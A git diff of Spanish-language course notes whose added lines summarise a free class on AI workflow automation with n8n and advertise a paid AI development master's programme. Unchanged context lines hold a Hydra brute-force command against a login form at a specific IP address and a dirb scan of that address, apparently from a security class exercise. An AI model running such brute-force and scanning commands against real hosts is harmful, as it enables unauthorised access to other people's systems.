@@ -51,3 +51,28 @@
   - Ataque de fuerza bruta: Hydra (Kali Linux) + rockyou, SecLists
   - hydra -l admin .P /rockyout.txt -t 16 -f -V 46.62.198.88 http-post-form "index.php:username=^USER^&password=^PASS^:Credenciales incorrectas." -o hydra_results.txt
   - dirb http://46.62.198.88
+
+
+## [Curso de Desarrollo con IA Gratis - Clase 3](https://www.youtube.com/watch?v=NijkYdsCfjA)
+
+### Automatización con IA
+  - [n8n](https://n8n.io/): AI workflow automation
+for technical teams
+    - Integraciones (Workflows)
+    - Workflow inicia con un trigger
+    - Los nodos se conectan
+    - Click derecho -> Pin -> Guarda el último dato ejecutado y se puede ejecutar como prueba
+    - Scraper AI
+
+### Master de Desarrollo con IA
+  - 100% Online, Inicio 10 Oct, A tu ritmo, duración de 3 meses
+  - Formación continua, Acceso vitalicio, Actualizaciones constantes
+  - Titulación Universitaria 100 Euros
+  - Metodología de 4 Fases:
+    - Fundamentos del Desarrollo
+    - Fundamentos de la IA
+    - Calidad del Código y Seguridad
+    - Big School
+  - +50 Módulos, 500 Clases, 200 Horas, 50 Herramientas
+  - 1 - to - 1 6 meses, Directos vitalicios, Comunidad vitalicia
+  - $ 1,497 Euros
